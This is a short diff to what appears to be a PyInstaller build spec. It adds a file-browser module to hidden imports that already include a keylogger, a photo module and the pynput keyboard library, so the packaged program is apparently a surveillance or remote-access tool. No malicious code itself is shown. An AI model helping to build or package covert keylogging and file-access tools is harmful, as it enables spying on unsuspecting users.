@@ -18,7 +18,8 @@ a = Analysis(
         'modules.photo',
         'pynput',
         'pynput.keyboard',
-        'modules.keylogger'
+        'modules.keylogger',
+        'modules.file_browser'
     ],
     hookspath=[],
     hooksconfig={},
